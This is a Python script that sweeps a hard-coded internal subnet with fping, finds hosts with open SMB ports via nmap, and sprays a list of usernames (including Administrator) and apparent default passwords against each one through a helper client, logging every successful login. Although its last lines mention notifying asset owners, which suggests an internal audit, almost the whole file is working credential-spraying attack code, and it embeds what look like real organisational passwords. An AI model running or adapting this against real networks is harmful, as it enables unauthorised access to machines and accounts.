import subprocess
import datetime
from termcolor import colored
from datetime import datetime
import time
import nmap

cmd= ['fping', '-g', '''192.168.1.216/25 2>/dev/null''']

f=open("logs.txt",'w')

f.writelines("\n")

sub = subprocess.Popen(cmd, shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)

ul=[]
dl=[]
vuln=[]
user=['new1','new2','new3','Administrator','CCDAdmin','CCDuser']
passwd=['Infy@123','HelloWorld@123']

count=0
ap=''
true_details=[]
le=0
print("Starting Segment spraying..\n")
then=datetime.now()
f.writelines("\nStarting Segment spraying..\n")
start=time.asctime(time.localtime(time.time()))
f.writelines(start+"\n")
print(then)

for line in sub.stdout:
            line=line.strip()
	    le+=1
            ip = line.split(" ",1)[0]
	    if "is alive" in line:
	    	ul.append(ip)
	    elif "is unreachable" in line:
	    	dl.append(ip)
msg1="\nFound "+str(len(ul))+" Machines Alive Out of "+str(le)+"\n"
print(msg1)
f.writelines("\n"+msg1)
sub.stdout.close()

for up in ul:

	nm=nmap.PortScanner()
	
	nm.scan(up,'139,445')

	if nm[up]['tcp'][139]['state']=='open' or nm[up]['tcp'][445]['state']=='open':
		print("\nSMB port is Open... \n")
		ap=up

		msg2="Connecting to "+ap+"\n"
		print(msg2)
		f.writelines("\n"+msg2)

		for p in passwd:
		
			
			for u in user:

	

				target_ip= u+":"+p+"@"+ap 
				#print(target_ip)
	
				cmd= ['python','myclient.py', target_ip]
						
				count+=1
				thn=datetime.now()
				sub = subprocess.Popen(cmd, shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE, close_fds=True)

				nw=datetime.now()
				durat=nw-thn
				dur_sec=durat.total_seconds()
			

				for l in sub.stdout:
					if l.startswith('[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid'):
						print colored("Bad Credentials\n",'blue')
						f.writelines("\nBad Credentials\n")
					elif l.startswith('Connection Established pa..'):
						true_details.append(up)
						print colored("Successfully Logged into  "+ap+" with "+u+" "+p+"\n",'red')
						f.writelines("\nSuccessfully Logged into  "+ap+" with "+u+" "+p+"\n")
						communication=ap+"--- Login Details: "+""+u+" with "+p
				                vuln.append(communication)
				'''else:
					print colored("Failed to Login\n",'yellow')'''		
				sub.stdout.close()
		#if dur_sec =>55:
	
now=datetime.now()
dur=now-then
dur_s=dur.total_seconds()
hours=divmod(dur_s,3600)[0]
minutes=divmod(dur_s,60)[0]

print colored("\nsuccessfully covered "+str(len(ul))+" machines in entire " +"ip segment with "+str(count)+" Login attempts in"+str(hours)+" hours, "+str(minutes)+" minutes.\n",'green')

f.writelines("\nsuccessfully covered "+str(len(ul))+" machines in entire " +"ip segment with "+str(count)+" Login attempts in"+str(hours)+" hours, "+str(minutes)+" minutes.\n")

cls=time.asctime(time.localtime(time.time()))

f.writelines("\n"+cls+"\n")

f.close()
print colored("\n\nPrepring to send user communication to following asset Owners:\n\n",'green')

for v in vuln:
	
	print colored(v+"\n",'yellow')

